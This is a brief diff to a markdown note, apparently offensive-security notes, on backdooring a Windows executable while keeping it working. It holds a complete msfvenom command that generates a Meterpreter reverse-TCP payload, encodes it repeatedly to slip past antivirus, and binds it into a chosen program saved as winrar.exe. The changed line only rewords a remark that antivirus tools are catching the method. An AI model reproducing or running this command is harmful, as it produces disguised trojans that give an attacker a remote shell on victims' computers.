@@ -13,4 +13,4 @@ Winrar will allow you to inject
 Maintain functionality of exe  
 1. Download winrar
 2. ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Host IP) LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x (executable you are injecting) > winrar.exe```  
-This technique doesnt work muc hany longer due to antivirus catching on
+_This technique may not work much longer as AVs are catching on_
